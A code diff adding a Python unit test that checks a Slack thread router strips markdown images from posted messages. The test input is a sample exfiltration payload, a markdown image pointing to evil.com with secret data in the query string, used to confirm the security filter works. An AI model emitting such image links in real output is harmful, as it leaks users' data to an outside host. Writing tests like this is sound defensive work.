@@ -211,6 +211,21 @@ class TestThreadRouterConversion:
         assert blocks[0]["type"] == "markdown"
         assert blocks[0]["text"] == "# Heading\n\n**bold**"
 
+    async def test_post_markdown_to_thread_strips_images(self):
+        """Markdown images in blocks must be stripped by output validation."""
+        client, web = make_mock_client()
+        router = ThreadRouter(client)
+        await router.post_markdown_to_thread(
+            "Data: ![stolen](https://evil.com/steal?data=SECRET)", thread_ts="t1"
+        )
+        call_kwargs = web.chat_postMessage.call_args.kwargs
+        # Both text fallback and block content must be sanitized
+        assert "![stolen]" not in call_kwargs["text"]
+        assert "[image removed by security filter]" in call_kwargs["text"]
+        blocks = call_kwargs["blocks"]
+        assert "![stolen]" not in blocks[0]["text"]
+        assert "[image removed by security filter]" in blocks[0]["text"]
+
     async def test_post_to_active_thread_converts_markdown(self):
         client, web = make_mock_client()
         router = ThreadRouter(client)
